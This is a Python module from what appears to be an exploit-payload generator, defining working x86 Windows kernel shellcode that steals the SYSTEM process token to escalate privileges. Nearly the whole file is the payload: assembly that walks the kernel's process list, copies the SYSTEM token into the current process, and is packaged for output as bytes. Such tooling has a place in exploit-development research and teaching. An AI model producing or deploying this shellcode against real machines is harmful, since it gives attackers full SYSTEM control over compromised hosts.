import sys

from sickle.common.lib.reversing.assembler import Assembler
from sickle.common.lib.generic.modparser import argument_check

class Shellcode():

    arch = 'x86'

    platform = "windows"

    name = f"Windows ({arch}) Kernel Token Stealing Stub"

    module = f"{platform}/{arch}/kernel_token_stealer"

    example_run = f"{sys.argv[0]} -p {module} -f c"

    ring = 0

    author = ["Mark Dowd",
              "Barnaby Jack",
              "wetw0rk"]

    tested_platforms = ["Windows 7 (6.1.7601 Service Pack 1 Build 7601)"]

    summary = "Kernel token stealing shellcode"

    description = ("Hijacks a security token of another process (specifically NT/AUTHORITY SYSTEM),"
                   "allowing for elevation of privileges.\n\n"
                   "WARNING: ASSUME KERNEL SHELLCODE DOES NOT HANDLE RETURN TO USERLAND!!")

    arguments = None

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        self.builder = Assembler(Shellcode.arch)

        return

    def generate_source(self):
        """Generates source code to be assembled by the keystone engine
        """

        shellcode = """
        _start:
            pushad                            ; Save register state
            xor eax, eax                      ; set ZERO
            mov eax, fs:[eax+0x124]           ; nt!_KPCR.PcrbData.CurrentThread
            mov eax, [eax + 0x50]             ; nt!_KTHREAD.ApcState.Process
            mov ecx, eax                      ; Copy current process _EPROCESS structure
            mov edx, 0x04                     ; WIN 10 SYSTEM PROCESS PID
        SearchSystemPID:
            mov eax, [eax + 0xb8]             ; nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, 0xb8
            cmp [eax + 0xb4], edx             ; nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID
        found:
            mov edx, [eax + 0xf8]             ; Get SYSTEM process nt!_EPROCESS.Token
            mov [ecx + 0xf8], edx             ; Replace target process nt!_EPROCESS.Token
            popad                             ; Restore registers
        """

        return shellcode

    def get_shellcode(self):
        """Generates Kernel Token Stealing Stub
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
